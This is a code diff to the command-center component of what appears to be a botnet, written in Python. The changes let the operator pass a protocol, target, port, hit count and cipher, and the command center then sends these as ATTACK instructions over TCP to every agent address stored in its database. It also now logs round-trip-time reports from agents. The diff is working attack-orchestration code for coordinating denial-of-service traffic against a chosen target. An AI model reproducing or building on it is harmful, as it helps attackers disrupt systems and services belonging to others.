@@ -177,6 +177,11 @@ class CommandCenter:
                     hostname=message["REGISTRATION"]["HOSTNAME"])
                 break
 
+            if "RTT" in message:
+                print("RTT message received from", addr)
+                print("RTT:", message["RTT"])
+                break
+
             else:
                 print('Data transmission finished from', addr, " closing connection and start listening mode again")
                 break
@@ -194,7 +199,7 @@ class CommandCenter:
             self.update_agent_last_seen()
             )
         
-    def send_data_to_agents(self):
+    def send_data_to_agents(self, PROTOCOL, TARGET, PORT, HITS, CIPHER):
         # get all agent ips from the database
         conn = sqlite3.connect(fr'{self.path}\CC_DATABASE.db')
         cursor = conn.cursor()
@@ -207,14 +212,16 @@ class CommandCenter:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 try:
                         # Send attack message to Command Center
-                        attack_message = json.dumps({"ATTACK": {}})
+                        attack_message = json.dumps({"ATTACK": {"PROTOCOL": f"{PROTOCOL}", "TARGET": f"{TARGET}", "PORT": f"{PORT}", "HITS": f"{HITS}", "CIPHER": f"{CIPHER}"}})
                         # Connect to the command center and send the HB
-                        s.connect((self.COMMAND_CENTER, 9191))
-                        s.sendall(attack_message_message.encode())
+                        print(f"\033[1;32mSending attack instructions to {i[2]}")
+                        s.connect((i[2], 8574))
+                        #s.connect(("172.17.0.2", 8574))
+                        s.sendall(attack_message.encode())
                         # close the connection
                         s.close()
                         # Print the attack message with the current time
                         print(f"\033[1;attack sent to Command Center @ {time.ctime()}")
                         time.sleep(15)
                 except Exception as e:
-                    print(f"\033[1;31mERROR: Failed to send attack instructions to {self.COMMAND_CENTER}: ", e)
+                    print(f"\033[1;31mERROR: Failed to send attack instructions to {i[2]}: ", e)
